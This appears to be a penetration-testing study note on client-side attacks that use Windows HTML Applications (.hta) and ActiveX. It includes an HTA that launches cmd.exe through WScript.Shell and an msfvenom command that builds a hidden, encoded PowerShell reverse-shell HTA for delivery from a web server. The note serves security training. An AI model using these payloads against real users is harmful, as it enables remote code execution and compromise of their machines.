
# Client-Side-Attacks-HTML-Applications

## Leveraging HTML Applications
[HTML Applications](https://docs.microsoft.com/en-us/previous-versions//ms536496(v=vs.85)?redirectedfrom=MSDN), with file extension .hta can be excuted on a Windows Client with the `mshta.exe`. This is to allow Internet Explore to arbitrarily execute applications within itself rather than downloading and manual executing a remote executable. An attacker can run that within the context of the user to avoid security restrictions. [ActiveX](https://en.wikipedia.org/wiki/ActiveX) is deprecated software that found on legacy systems was controversial and [historically insecure](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=ActiveX) comparatively to other technologies, thus low hanging RCEs. Whereas [Edge](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Edge) still vulnerable just less insecure also actively researched due to modern widespread default Windows Browser. HTML application are HTML with [[Useful_Javascript]] or [[Useful-Visual-Basic]], HTML application are excuted outseide the browser and can be used to execute legacy and dangerous features blocked by the Browser.

## ActiveX

ActiveXObjects can provide access to underlying OS commands, using Windows Script Host functionality or WScript to access the Windows Script Host Shell object. This can  be

```html

<html>
<head>

<script>

  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);
  
</script>

</head>
<body>

<script>
  
  self.close(); // Close addition window behind command prompt
    
</script>

	
</body>
</html>
```

Users that broswer to this page to access the file, IE pops: `Open, Save, Save As`, selecting `Open` will prompt a `Allow || Don't Allow` options to default enabled sandbox called `Protected Mode` *"A website wants to open web content using this program on your Computer"* stating that Name: Microsoft (R) HTML Application host, Publisher: Microsoft Windows. `Allow` will permit execution. Using MSFvenom we can turn the script above into an actual attack with reverse_shell.hta. 
```bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f hta-psh -o /var/www/html/reverse_shell.hta
```

This payload adds powershell commands to  `-NoProfile`, `WindowStyle hidden` and `-EncodedCommand`. The reason behind the `EncodedCommand` existing in Powershell is to not have to deal with escape characters, maybe you want automate a script in the background with `WindowStyle hidden`like run patching or AD policy updates and `-NoProfile` becuase maybe you just want to do some cli maths and don't want or need to authenicate yourself to do maths. All of these properties of powershell can be used, like many other for nefarious reasons.


## MSHTML.dll 

MSHTML.dll one of many [[Dynamic-Link-Library-Files]], which is specifically responsible as the Browser Engine, used regardless of IE being on the machine. From [LesFerch's Amazing Answer on Windows Forums](https://answers.microsoft.com/en-us/microsoftedge/forum/all/will-mshtaexe-default-to-edge-when-opening-an-hta/e6b278e3-e7d4-48a4-aff9-20e317e25a89):

*"Contrary to popular belief, Internet Explorer is still installed in Windows 11 and will remain in Windows 10. The only change is that in Windows 11 (and Windows 10 sometime after June 15, 2022) IE cannot be easily launched by the end-user. That is, attempting to directly run **iexplore.exe** will run **Edge** instead."*

IE can still be run via scripts using_ **_IE COM automation_**_. For example (LaunchIE.vbs):_
```vbscript
Set oIE = CreateObject("InternetExplorer.Application")

oIE.Visible = True

oIE.Navigate "about:blank" 'put your URL of choice here"
```

*"Code that uses **IE COM automation** will open IE and work as usual. Note that, for Windows 11, it must be build **22000.348** or higher (IE COM automation was broken in Windows 11 prior to the Nov 2021 update). Using Windows 11 (or Windows 10 after IE is "disabled"), any link in an **HTA**, using code such as **href** or **window.open,** will open in **Internet Explorer**. Using a computer, where Internet Explorer has been _completely removed_ via **Control Panel** **Add/Remove Features**, any link in an **HTA**, using code such as **href** or **window.open,** will not work. The **href** will do nothing and the **window.open** will generate an error. Therefore, you should NOT remove IE from Windows 10 or Windows 11. Web pages that are opened via an **iframe** in an **HTA** will continue to work in all cases. Unfortunately, many external web sites don't allow their content to be loaded in an iframe."*

## References

[ActiveX Wiki](https://en.wikipedia.org/wiki/ActiveX) 
[LesFerch's Amazing Answer on Windows Forums](https://answers.microsoft.com/en-us/microsoftedge/forum/all/will-mshtaexe-default-to-edge-when-opening-an-hta/e6b278e3-e7d4-48a4-aff9-20e317e25a89)
[CVE ActiveX](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=ActiveX)
[CVE Edge](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Edge) 